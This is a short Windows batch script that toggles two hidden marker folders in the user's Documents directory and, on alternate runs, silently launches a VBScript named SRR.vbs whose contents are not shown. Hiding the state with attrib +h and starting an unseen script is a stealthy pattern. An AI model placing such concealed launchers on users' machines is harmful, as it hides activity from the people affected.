cd C:/users/%username%/documents

if exist 2 rmdir 1
if exist 2 start C:/users/%username%/documents/RR/SRR.vbs
if exist 2 rmdir 2

if exist 1 ( md 2
attrib +h 2 )
if not exist 1 ( md 1
attrib +h 1 )
exit